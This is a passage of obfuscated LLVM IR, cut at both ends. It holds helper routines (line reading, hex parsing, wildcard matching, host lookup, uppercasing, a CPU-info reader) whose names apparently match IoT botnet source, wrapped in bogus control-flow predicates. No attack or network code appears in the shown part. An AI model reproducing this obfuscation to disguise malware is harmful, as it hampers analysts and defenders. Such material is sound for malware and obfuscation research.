  %59 = phi i1 [ false, %51 ], [ %57, %54 ]
  %60 = load i32, i32* @x.25
  %61 = load i32, i32* @y.26
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %68 = load i32, i32* @x.25
  %69 = load i32, i32* @y.26
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %28, label %76

; <label>:76:                                     ; preds = %originalBBpart24
  %77 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #5
  %78 = load i32*, i32** @fdopen_pids, align 8
  %79 = load i32, i32* %4, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i32, i32* %78, i64 %80
  store i32 0, i32* %81, align 4
  %82 = load i32, i32* %8, align 4
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %85

; <label>:84:                                     ; preds = %76
  br label %92

; <label>:85:                                     ; preds = %76
  %86 = bitcast %struct.in_addr* %9 to i32*
  %87 = load i32, i32* %7, align 4
  store i32 %87, i32* %86, align 4
  %88 = bitcast %struct.in_addr* %9 to i32*
  %89 = load i32, i32* %88, align 4
  %90 = and i32 %89, 65280
  %91 = ashr i32 %90, 8
  br label %92

; <label>:92:                                     ; preds = %85, %84
  %93 = phi i32 [ -1, %84 ], [ %91, %85 ]
  store i32 %93, i32* %2, align 4
  br label %94

; <label>:94:                                     ; preds = %92, %19
  %95 = load i32, i32* %2, align 4
  ret i32 %95

originalBBalteredBB:                              ; preds = %originalBB, %28
  %96 = load i32*, i32** @fdopen_pids, align 8
  %97 = load i32, i32* %3, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i32, i32* %96, i64 %98
  %100 = load i32, i32* %99, align 4
  %101 = call i32 @waitpid(i32 %100, i32* %7, i32 0)
  store i32 %101, i32* %8, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #2

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #2

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #2

declare i32 @waitpid(i32, i32*, i32) #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.27
  %5 = load i32, i32* @y.28
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.27
  %18 = load i32, i32* @y.28
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %originalBBpart215, %originalBBpart2
  %26 = load i32, i32* %15, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %57

; <label>:28:                                     ; preds = %25
  %29 = load i32, i32* %16, align 4
  %30 = load i32, i32* %13, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %57

; <label>:32:                                     ; preds = %28
  %33 = load i32, i32* @x.27
  %34 = load i32, i32* @y.28
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i8*, i8** %12, align 8
  %42 = load i32, i32* %16, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = getelementptr inbounds i8, i8* %44, i64 -1
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp ne i32 %47, 10
  %49 = load i32, i32* @x.27
  %50 = load i32, i32* @y.28
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %57

; <label>:57:                                     ; preds = %originalBBpart24, %28, %25
  %58 = phi i1 [ false, %28 ], [ false, %25 ], [ %48, %originalBBpart24 ]
  br i1 %58, label %59, label %85

; <label>:59:                                     ; preds = %57
  %60 = load i32, i32* @x.27
  %61 = load i32, i32* @y.28
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %59
  %68 = load i32, i32* %14, align 4
  %69 = load i8*, i8** %12, align 8
  %70 = load i32, i32* %16, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  %73 = call i64 @read(i32 %68, i8* %72, i64 1)
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %15, align 4
  %75 = load i32, i32* %16, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %16, align 4
  %77 = load i32, i32* @x.27
  %78 = load i32, i32* @y.28
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br label %25

; <label>:85:                                     ; preds = %57
  %86 = load i32, i32* @x.27
  %87 = load i32, i32* @y.28
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %85
  %94 = load i32, i32* %15, align 4
  %95 = icmp eq i32 %94, 0
  %96 = load i32, i32* @x.27
  %97 = load i32, i32* @y.28
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %95, label %104, label %105

; <label>:104:                                    ; preds = %originalBBpart219
  br label %123

; <label>:105:                                    ; preds = %originalBBpart219
  %106 = load i32, i32* @x.27
  %107 = load i32, i32* @y.28
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %105
  %114 = load i8*, i8** %12, align 8
  %115 = load i32, i32* @x.27
  %116 = load i32, i32* @y.28
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %123

; <label>:123:                                    ; preds = %originalBBpart223, %104
  %124 = phi i8* [ null, %104 ], [ %114, %originalBBpart223 ]
  %125 = load i32, i32* @x.27
  %126 = load i32, i32* @y.28
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %123
  %133 = load i32, i32* @x.27
  %134 = load i32, i32* @y.28
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  ret i8* %124

originalBBalteredBB:                              ; preds = %originalBB, %3
  %141 = alloca i8*, align 8
  %142 = alloca i32, align 4
  %143 = alloca i32, align 4
  %144 = alloca i32, align 4
  %145 = alloca i32, align 4
  store i8* %0, i8** %141, align 8
  store i32 %1, i32* %142, align 4
  store i32 %2, i32* %143, align 4
  store i32 1, i32* %144, align 4
  store i32 0, i32* %145, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %146 = load i8*, i8** %12, align 8
  %147 = load i32, i32* %16, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i8, i8* %146, i64 %148
  %150 = getelementptr inbounds i8, i8* %149, i64 -1
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp ne i32 %152, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %59
  %154 = load i32, i32* %14, align 4
  %155 = load i8*, i8** %12, align 8
  %156 = load i32, i32* %16, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8, i8* %155, i64 %157
  %159 = call i64 @read(i32 %154, i8* %158, i64 1)
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %15, align 4
  %161 = load i32, i32* %16, align 4
  %_ = sub i32 0, %161
  %gen = add i32 %_, 1
  %_7 = sub i32 %161, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 0, %161
  %gen10 = add i32 %_9, 1
  %_11 = shl i32 %161, 1
  %_12 = sub i32 0, %161
  %gen13 = add i32 %_12, 1
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %16, align 4
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %85
  %163 = load i32, i32* %15, align 4
  %164 = icmp eq i32 %163, 0
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %105
  %165 = load i8*, i8** %12, align 8
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %123
  br label %originalBB25
}

declare i64 @read(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %70 [
    i32 0, label %9
    i32 42, label %29
    i32 63, label %53
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i32, i32* @x.31
  %11 = load i32, i32* @y.32
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* @x.31
  %22 = load i32, i32* @y.32
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %108

; <label>:29:                                     ; preds = %2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 1
  %32 = load i8*, i8** %5, align 8
  %33 = call i32 @wildString(i8* %31, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %49

; <label>:35:                                     ; preds = %29
  %36 = load i8*, i8** %5, align 8
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %35
  %41 = load i8*, i8** %4, align 8
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i64 1
  %44 = call i32 @wildString(i8* %41, i8* %43)
  %45 = icmp ne i32 %44, 0
  %46 = xor i1 %45, true
  br label %47

; <label>:47:                                     ; preds = %40, %35
  %48 = phi i1 [ false, %35 ], [ %46, %40 ]
  br label %49

; <label>:49:                                     ; preds = %47, %29
  %50 = phi i1 [ true, %29 ], [ %48, %47 ]
  %51 = xor i1 %50, true
  %52 = zext i1 %51 to i32
  store i32 %52, i32* %3, align 4
  br label %108

; <label>:53:                                     ; preds = %2
  %54 = load i8*, i8** %5, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %66

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %4, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 1
  %61 = load i8*, i8** %5, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = call i32 @wildString(i8* %60, i8* %62)
  %64 = icmp ne i32 %63, 0
  %65 = xor i1 %64, true
  br label %66

; <label>:66:                                     ; preds = %58, %53
  %67 = phi i1 [ false, %53 ], [ %65, %58 ]
  %68 = xor i1 %67, true
  %69 = zext i1 %68 to i32
  store i32 %69, i32* %3, align 4
  br label %108

; <label>:70:                                     ; preds = %2
  %71 = load i32, i32* @x.31
  %72 = load i32, i32* @y.32
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load i8*, i8** %4, align 8
  %80 = load i8, i8* %79, align 1
  %81 = zext i8 %80 to i32
  %82 = call i32 @toupper(i32 %81) #10
  %83 = load i8*, i8** %5, align 8
  %84 = load i8, i8* %83, align 1
  %85 = zext i8 %84 to i32
  %86 = call i32 @toupper(i32 %85) #10
  %87 = icmp eq i32 %82, %86
  %88 = load i32, i32* @x.31
  %89 = load i32, i32* @y.32
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %87, label %96, label %104

; <label>:96:                                     ; preds = %originalBBpart24
  %97 = load i8*, i8** %4, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 1
  %101 = call i32 @wildString(i8* %98, i8* %100)
  %102 = icmp ne i32 %101, 0
  %103 = xor i1 %102, true
  br label %104

; <label>:104:                                    ; preds = %96, %originalBBpart24
  %105 = phi i1 [ false, %originalBBpart24 ], [ %103, %96 ]
  %106 = xor i1 %105, true
  %107 = zext i1 %106 to i32
  store i32 %107, i32* %3, align 4
  br label %108

; <label>:108:                                    ; preds = %104, %66, %49, %originalBBpart2
  %109 = load i32, i32* @x.31
  %110 = load i32, i32* @y.32
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %108
  %117 = load i32, i32* %3, align 4
  %118 = load i32, i32* @x.31
  %119 = load i32, i32* @y.32
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %117

originalBBalteredBB:                              ; preds = %originalBB, %9
  %126 = load i8*, i8** %5, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  store i32 %128, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %129 = load i8*, i8** %4, align 8
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = call i32 @toupper(i32 %131) #10
  %133 = load i8*, i8** %5, align 8
  %134 = load i8, i8* %133, align 1
  %135 = zext i8 %134 to i32
  %136 = call i32 @toupper(i32 %135) #10
  %137 = icmp eq i32 %132, %136
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %108
  %138 = load i32, i32* %3, align 4
  br label %originalBB6
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %29

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* @x.33
  %14 = load i32, i32* @y.34
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  store i32 1, i32* %3, align 4
  %21 = load i32, i32* @x.33
  %22 = load i32, i32* @y.34
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:29:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %originalBBpart2
  %31 = load i32, i32* %3, align 4
  ret i32 %31

originalBBalteredBB:                              ; preds = %originalBB, %12
  store i32 1, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = load i32, i32* @x.35
  %3 = load i32, i32* @y.36
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i32, i32* @x.35
  %12 = load i32, i32* @y.36
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %19

; <label>:19:                                     ; preds = %originalBBpart28, %originalBBpart2
  %20 = load i32, i32* @x.35
  %21 = load i32, i32* @y.36
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = load i8, i8* %28, align 1
  %30 = icmp ne i8 %29, 0
  %31 = load i32, i32* @x.35
  %32 = load i32, i32* @y.36
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %30, label %39, label %64

; <label>:39:                                     ; preds = %originalBBpart24
  %40 = load i32, i32* @x.35
  %41 = load i32, i32* @y.36
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %39
  %48 = load i8*, i8** %10, align 8
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = call i32 @toupper(i32 %50) #10
  %52 = trunc i32 %51 to i8
  %53 = load i8*, i8** %10, align 8
  store i8 %52, i8* %53, align 1
  %54 = load i8*, i8** %10, align 8
  %55 = getelementptr inbounds i8, i8* %54, i32 1
  store i8* %55, i8** %10, align 8
  %56 = load i32, i32* @x.35
  %57 = load i32, i32* @y.36
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %19

; <label>:64:                                     ; preds = %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %65 = alloca i8*, align 8
  store i8* %0, i8** %65, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %19
  %66 = load i8*, i8** %10, align 8
  %67 = load i8, i8* %66, align 1
  %68 = icmp ne i8 %67, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %39
  %69 = load i8*, i8** %10, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = call i32 @toupper(i32 %71) #10
  %73 = trunc i32 %72 to i8
  %74 = load i8*, i8** %10, align 8
  store i8 %73, i8* %74, align 1
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %10, align 8
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %194, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %196

; <label>:13:                                     ; preds = %8
  %14 = load i32, i32* @x.37
  %15 = load i32, i32* @y.38
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %22)
  %23 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %24 = call i8* @strstr(i8* %23, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0)) #10
  %25 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %26 = icmp eq i8* %24, %25
  %27 = load i32, i32* @x.37
  %28 = load i32, i32* @y.38
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %194

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* @x.37
  %37 = load i32, i32* @y.38
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %45 = getelementptr inbounds i8, i8* %44, i64 8
  store i8* %45, i8** %6, align 8
  %46 = load i32, i32* @x.37
  %47 = load i32, i32* @y.38
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %54

; <label>:54:                                     ; preds = %103, %originalBBpart24
  %55 = load i8*, i8** %6, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 32
  br i1 %58, label %85, label %59

; <label>:59:                                     ; preds = %54
  %60 = load i8*, i8** %6, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 9
  br i1 %63, label %85, label %64

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* @x.37
  %66 = load i32, i32* @y.38
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %64
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 58
  %77 = load i32, i32* @x.37
  %78 = load i32, i32* @y.38
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
